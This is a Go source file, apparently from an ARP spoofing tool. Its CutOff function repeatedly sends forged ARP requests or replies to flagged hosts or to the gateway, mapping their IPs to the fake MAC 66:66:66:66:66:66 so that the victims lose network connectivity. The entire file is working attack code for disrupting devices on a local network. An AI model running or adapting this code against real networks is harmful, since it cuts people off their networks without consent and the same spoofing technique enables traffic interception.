package Action

import (
	"log"
	"net"
	"time"

	"ARPSpoofing/Socket"

	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func CutOff(timeCh <-chan time.Time, hostTable *Table, iface net.Interface) error {
	handle, err := pcap.OpenLive(iface.Name, 65536, true, 1000)
	if err != nil {
		return err
	}
	for {
		<-timeCh
		for _, host := range hostTable.HModel.Data {
			if host.IsCutOff == false {
				continue
			}
			var dstIP net.IP
			var dstMAC net.HardwareAddr
			var srcIP net.IP
			var srcMAC net.HardwareAddr = net.HardwareAddr{0x66, 0x66, 0x66, 0x66, 0x66, 0x66}
			gIndex := hostTable.HModel.GatewayIndex
			var gIP net.IP = net.IP(hostTable.HModel.Data[gIndex].IP)
			var gMAC net.HardwareAddr = net.HardwareAddr(hostTable.HModel.Data[gIndex].MAC)
			var op uint16
			if host.Spooling == "Host" {
				dstIP = net.IP(host.IP)
				dstMAC = net.HardwareAddr(host.MAC)
				srcIP = gIP
			} else {
				dstIP = gIP
				dstMAC = gMAC
				srcIP = net.IP(host.IP)
			}
			if host.PacketType == "Request" {
				op = layers.ARPRequest
			} else {
				op = layers.ARPReply
			}
			err := Socket.SendARP(handle, dstMAC, srcMAC, dstMAC, srcMAC, dstIP, srcIP, op)
			if err != nil {
				log.Println("sent arp request failed,because ", err)
			} else {
				log.Printf("ethDstMAC:%s,ethSrcMAC:%s,arpDstMAC:%s,arpSrcIP:%s,arpDstIP:%s,arpSrcIP:%s\n",
					dstMAC.String(), srcMAC.String(),
					dstMAC.String(), srcMAC.String(),
					dstIP.String(), srcIP.String())
			}
		}
	}
}
